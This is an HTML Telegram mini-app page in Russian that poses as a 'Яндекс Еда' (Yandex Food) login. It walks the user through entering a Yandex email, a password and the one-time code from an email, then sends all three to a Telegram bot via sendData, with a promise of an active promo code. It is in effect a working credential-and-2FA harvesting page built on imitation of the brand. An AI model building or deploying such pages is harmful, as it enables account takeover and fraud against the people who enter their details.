<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Яндекс Еда</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f8f9fa; }
        .step { display: none; }
        .step.active { display: block; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ffcc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body class="min-h-screen p-4">

    <!-- Шаг 1: Почта -->
    <div id="step1" class="step active">
        <h1 class="text-2xl font-bold text-center mb-8">Вход в Яндекс Еда</h1>
        <input id="email" type="email" placeholder="Почта (yandex.ru)" 
               class="w-full p-4 rounded-2xl border border-gray-300 text-lg">
        <button onclick="nextStep(2)" 
                class="w-full mt-6 bg-black text-white py-4 rounded-2xl font-bold text-lg">Далее</button>
    </div>

    <!-- Шаг 2: Пароль -->
    <div id="step2" class="step">
        <h1 class="text-2xl font-bold text-center mb-8">Введите пароль</h1>
        <input id="password" type="password" placeholder="Пароль" 
               class="w-full p-4 rounded-2xl border border-gray-300 text-lg">
        <button onclick="nextStep(3)" 
                class="w-full mt-6 bg-black text-white py-4 rounded-2xl font-bold text-lg">Далее</button>
    </div>

    <!-- Шаг 3: Код из почты -->
    <div id="step3" class="step">
        <h1 class="text-2xl font-bold text-center mb-8">Код из письма</h1>
        <input id="code2fa" type="text" placeholder="123456" maxlength="6"
               class="w-full p-4 rounded-2xl border border-gray-300 text-lg text-center text-3xl tracking-widest">
        <button onclick="startLogin()" 
                class="w-full mt-6 bg-green-600 text-white py-4 rounded-2xl font-bold text-lg">Войти в аккаунт</button>
    </div>

    <!-- Экран загрузки -->
    <div id="loading" class="hidden flex flex-col items-center justify-center h-screen">
        <div class="loader"></div>
        <p class="mt-6 text-lg">Логинюсь в Яндекс Еда...</p>
        <p id="loading-text" class="text-sm text-gray-500 mt-2">Это займёт 5-15 секунд</p>
    </div>

    <!-- Главный экран (после логина) -->
    <div id="main" class="hidden">
        <h1 class="text-3xl font-bold text-yellow-500 text-center mb-4">Яндекс Еда</h1>
        <p class="text-center text-green-600 font-medium" id="status-text">Аккаунт подключён • Промик активен</p>
        <div id="menu-content" class="mt-8"></div>
    </div>

    <script>
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        Telegram.WebApp.setBackgroundColor("#f8f9fa");

        let currentEmail = "";
        let currentPassword = "";

        function showStep(n) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + n).classList.add('active');
        }

        function nextStep(n) {
            if (n === 2) currentEmail = document.getElementById('email').value.trim();
            if (n === 3) currentPassword = document.getElementById('password').value.trim();
            showStep(n);
        }

        async function startLogin() {
            const code = document.getElementById('code2fa').value.trim();
            if (!currentEmail || !currentPassword || !code) {
                alert("Заполни все поля");
                return;
            }

            document.querySelectorAll('.step').forEach(s => s.classList.add('hidden'));
            document.getElementById('loading').classList.remove('hidden');

            // Отправляем данные в бот
            const data = {
                action: "login",
                email: currentEmail,
                password: currentPassword,
                code2fa: code
            };

            Telegram.WebApp.sendData(JSON.stringify(data));
            document.getElementById('loading-text').textContent = "Ждём ответ от бота...";
        }

        // Получаем ответ от бота (если бот пришлёт сообщение)
        Telegram.WebApp.onEvent('webAppDataReceived', () => {
            // Можно добавить, но обычно бот просто отправляет сообщение
        });

        // Если бот отправит сообщение "success", можно перезагрузить
        function checkSuccess() {
            // Пока просто показываем главное меню (бот уже сохранил сессию)
            setTimeout(() => {
                document.getElementById('loading').classList.add('hidden');
                document.getElementById('main').classList.remove('hidden');
                loadMenu();
            }, 1500);
        }

        // Загрузка меню после логина
        async function loadMenu() {
            const content = document.getElementById('menu-content');
            content.innerHTML = `<p class="text-center text-lg">Меню загружается с твоим промиком...</p>`;
            // Здесь потом будет реальный fetch через прокси, пока заглушка
        }

        // Авто-переход на главный экран после успешного логина (бот пришлёт сообщение)
        // Пока для теста просто показываем
        setTimeout(() => {
            if (document.getElementById('loading').classList.contains('hidden') === false) {
                checkSuccess();
            }
        }, 8000);
    </script>
</body>
</html>
